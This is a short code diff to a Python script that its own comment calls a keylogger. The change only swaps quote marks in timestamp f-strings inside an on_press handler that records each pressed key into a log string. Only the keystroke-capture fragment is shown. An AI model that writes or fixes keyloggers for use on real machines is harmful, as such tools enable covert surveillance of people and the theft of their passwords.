@@ -116,10 +116,10 @@ t_start = time.time()  # Initialize the start time for the keylogger
 def on_press(key):
     global log, t_start
     if not log:
-        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
+        log += f"\n[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] "
     # if more than 20 seconds have passed since the last key press, add new line
     if time.time() - t_start > 20:
-        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
+        log += f"\n[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] "
     try:
         # Append the pressed key to the log
         log += key.char
